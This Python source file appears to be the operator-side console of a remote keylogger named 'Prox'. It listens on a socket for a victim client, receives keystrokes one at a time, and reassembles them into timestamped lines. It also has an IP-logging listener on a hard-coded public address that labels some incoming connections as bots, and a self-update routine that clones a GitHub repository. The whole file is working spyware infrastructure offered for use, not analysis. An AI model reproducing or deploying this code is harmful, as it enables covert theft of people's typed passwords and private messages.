import os, time, socket, keyboard, threading
from threading import Thread
from datetime import datetime

self_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
self_ip.connect(("8.8.8.8", 80))
IP = (self_ip.getsockname()[0])
self_ip.close()

def keylog_word_fix():
	global keylog_list_joined
	keylog_list_joined = ''.join(keylog_list)

	try:
		if len(str(keylog_list_joined)) == 0:
			pass

		else:

			if 'Key.caps_lock' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.caps_lock', '<|+CAPS+|>')

			if 'Key.esc' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.esc', '<|+ESC+|>')

			if 'Key.insert' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.insert', '<|+INSERT+|>')

			if 'Key.delete' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.delete', '<|+DELETE+|>')

			if 'Key.ctrl_l' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.ctrl_l', '<|+CTRL+|>')

			if 'Key.ctrl_r' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.ctrl_r', '<|+CTRL+|>')

			if 'Key.f12' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.f12', '<|+F12+|>')

			if 'Key.f11' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.f11', '<|+F11+|>')

			if 'Key.f10' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.f10', '<|+F10+|>')

			if 'Key.f9' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.f9', '<|+F9+|>')

			if 'Key.f8' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.f8', '<|+F8+|>')

			if 'Key.f7' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.f7', '<|+F7+|>')

			if 'Key.f6' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.f6', '<|+F6+|>')

			if 'Key.f5' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.f5', '<|+F5+|>')

			if 'Key.f4' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.f4', '<|+F4+|>')

			if 'Key.f3' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.f3', '<|+F3+|>')

			if 'Key.f2' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.f2', '<|+F2+|>')

			if 'Key.f1' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.f1', '<|+F1+|>')

			if 'Key.tab' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.tab', '<|+TAB+|>')

			if 'Key.shift' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.shift', '<|+SHIFT+|>')

			if 'Key.space' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.space', ' ')
									
			if 'Key.enter' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.enter', '')

			if 'Key.up' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.up', '<|+UP+|>')

			if 'Key.right' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.right', '<|+RIGHT+|>')

			if 'Key.left' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.left', '<|+LEFT+|>')

			if 'Key.down' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.down', '<|+DOWN+|>')

			if 'Key.backspace' in keylog_list_joined:
				keylog_list_joined = keylog_list_joined.replace('Key.backspace', '')

			else:
				pass
	except Exception as e:
		input("Error: " + str(e))


		
def OS():
	if os.name == "nt":
		os.system("cls")

	else:
		os.system("clear")

def keylog():
	global socket_, conn, keylog_list, keylog_list_count
	OS()
	port = (9999)
	socket_ = socket.socket()
	try:
		socket_.bind((IP, port))

	except Exception as error:
		input("Oops, something went wrong!\nError: " + str(error) + "\nPress Enter...")
		main()

	print("Loading...\n")
	socket_.listen(10)
	conn, address = socket_.accept()
	OS()
	while True:
		print("____________________________________")
		print("|Connected to " + str(address[0]) + ":" + str(address[1]) + "   |")
		print("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
		print("|1. Keylogger...                   |")
		print("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")

		awn_keylog = input("\nEnter a number or quit: ")

		if awn_keylog == "1":
			OS()
			print("Press CTRL + C and press enter to quit...\n")
			try:
				keylog_list = []
				key_cap = False
				key_cap_count = 0

				while True:

					client_response = str(conn.recv(8192), ("utf-8"))
					try:
						for x in range(100):
							if 'Key.backspace' in keylog_list:
								del keylog_list[-2]
								del keylog_list[-1]

							else:
								break
					except:
						pass
						
					if client_response == "Key.enter":
						keylog_word_fix()
						keylog_list_count = len(keylog_list_joined)
						underscore_count = ("_") * (keylog_list_count)
						time_ = datetime.now()

						if keylog_list_count == 0:
							pass

						else:

							print("______________________________________________________________________________" + underscore_count)  
							print("|PROX> (" + str(keylog_list_joined) + ") <PROX|Character Count> (" + str(keylog_list_count) + ")|Date & Time> (" + str(time_) + ")|")

						del keylog_list[:]

					else:
						keylog_list.append(str(client_response))
			except Exception as e:

				conn.close()
				socket_.close()
				input("Error: " + str(e))
				main()
				pass

		elif awn_keylog == "quit":
			conn.close()
			socket_.close()
			main()

		else:
			pass


def IP_log():
	OS()
	print("Waiting for conection...\n")
	host = ("206.189.66.223")
	port = 8080

	socket_ = socket.socket()
	socket_.bind((host, port))

	while True:
		try:
			socket_.listen(50)
			conn, address = socket_.accept()
			
			if ("39" or "35") in str(address[0]):

				print("\nBot connection to: " + str(address[0]))
			
			else:
				print("\nIP: " + str(address[0]))
				print("MAC: " + str(address[1]))
				conn.close()
				socket_.close()
				break

		except:
			pass

	input("Press enter...")
	main()

def update_prox():
	OS()
	print("Updating Prox...")
	os.system("git clone https://github.com/devinthecreep/infinity-server.git")
	os.system("cd infinity-server")
	os.system("mv prox.py ..")
	os.system("cd ..")
	os.system("rm -r infinity-server")
	input("Update complete...\nPress enter...")
	exit()


def main():
	try:
		while True:
			OS()
			print(",------.")                         
			print("|  .--. ',--.--. ,---.,--.  ,--.") 
			print("|  '--' ||  .--'| .-. |\  `'  / ") 
			print("|  | --' |  |   ' '-' '/  /.  \ ") 
			print("`--'     `--'    `---''--'  '--'")
			print("1. Keylog...  IP: " + IP)
			print("2. IP log...")
			print("9. Update Prox... test work2")

			awn = input("\nEnter a number or quit: ")
			if awn == ("1"):
				try:
					keylog()

				except KeyboardInterrupt:
					conn.close()
					socket_.close()
					main()


			elif awn == ("2"):
				IP_log()

			elif awn == ("9"):
				update_prox()


			elif awn == ("quit"):
				exit()

			else:
				pass
	except Exception as e:
		input(e)

main()